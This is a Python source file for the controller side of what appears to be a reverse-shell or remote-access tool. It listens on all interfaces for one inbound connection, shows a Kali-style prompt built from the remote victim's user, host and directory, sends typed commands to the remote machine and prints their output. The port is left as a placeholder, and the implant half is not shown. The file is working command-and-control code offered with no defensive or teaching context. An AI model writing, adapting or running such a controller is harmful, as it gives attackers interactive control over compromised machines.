import socket, json, shutil, os

HOST = "0.0.0.0"
PORT = ....
MSG_DELIM = "\n"

# Colors
C_RESET = "\x1b[0m"
C_BOLD = "\x1b[1m"
C_RED = "\x1b[31m"
C_YELLOW = "\x1b[33m"
C_BLUE = "\x1b[34m"
C_GREEN = "\x1b[32m"


def shorten_cwd(cwd, user):
    if not cwd:
        return "~"
    home = f"/home/{user}"
    if cwd.startswith(home):
        cwd = cwd.replace(home, "~", 1)
    if len(cwd) > 30:
        parts = cwd.split("/")
        if len(parts) > 3:
            return "/" + parts[1] + "/.../" + parts[-1]
    return cwd


def build_prompt(state):
    user = state.get("user", "?")
    host = state.get("host", os.uname().nodename)
    cwd = shorten_cwd(state.get("cwd", "~"), user)
    return (
        f"{C_BOLD}{C_RED}┌──({C_YELLOW}{user}{C_RED}㉿{C_BLUE}{host}{C_RED})-{C_RESET}[{C_GREEN}{cwd}{C_RESET}{C_BOLD}{C_RED}]\n"
        f"└─$ {C_RESET}"
    )


def recv_json(conn):
    buf = ""
    while True:
        chunk = conn.recv(4096).decode(errors="replace")
        if not chunk:
            return None
        buf += chunk
        if MSG_DELIM in buf:
            line, buf = buf.split(MSG_DELIM, 1)
            try:
                return json.loads(line)
            except:
                continue


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")

    conn, addr = s.accept()
    print(f"[+] Connected from {addr}")

    state = {"cwd": "~", "user": "?", "host": os.uname().nodename}

    init = recv_json(conn)
    if init and init.get("status") == "connected":
        state["cwd"] = init.get("cwd", state["cwd"])
        state["user"] = init.get("user", state["user"])

    while True:
        prompt = build_prompt(state)
        try:
            cmd = input(prompt).strip()
        except EOFError:
            break

        if cmd.lower() in ("exit", "quit"):
            break

        payload = json.dumps(cmd) + MSG_DELIM
        try:
            conn.sendall(payload.encode())
        except:
            print("[!] Connection lost.")
            break

        resp = recv_json(conn)
        if not resp:
            print("[!] No response. Connection closed.")
            break

        if resp.get("status") == "output":
            print(resp.get("output", ""))
        elif resp.get("status") == "ok":
            if "cwd" in resp:
                state["cwd"] = resp["cwd"]
            print(resp.get("msg", ""))
        elif resp.get("status") == "error":
            print(f"{C_RED}[!] ERROR:{C_RESET} {resp.get('msg')}")

    conn.close()
    s.close()
    print("[*] Controller closed.")


if __name__ == "__main__":
    main()
